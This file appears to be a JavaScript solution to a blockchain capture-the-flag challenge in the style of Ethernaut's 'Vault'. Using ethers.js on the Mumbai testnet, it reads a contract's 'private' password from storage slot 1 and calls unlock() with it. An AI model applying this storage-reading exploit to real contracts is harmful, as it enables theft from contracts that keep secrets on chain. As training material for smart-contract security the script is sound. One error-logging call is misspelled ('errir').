const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"locked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xcf309012"},{"inputs":[{"internalType":"bytes32","name":"_password","type":"bytes32"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xec9b5b3a"}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(contract)) {
        console.log('vault already unlocked');
        process.exit(0);
    }

    console.log('reading private password...');
    const password = await provider.getStorage(contractAddress, 1);
    console.log(`password: ${password}`);

    console.log('unlocking vault...');
    const tx = await contract.connect(account).unlock(password);
    await tx.wait();

    console.log('checking vault status...');
    if (await isSolved(contract)) {
        console.log('solved!');
    } else {
        console.log('vault still locked. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(contract) {
    return !(await contract.locked());
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.errir('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
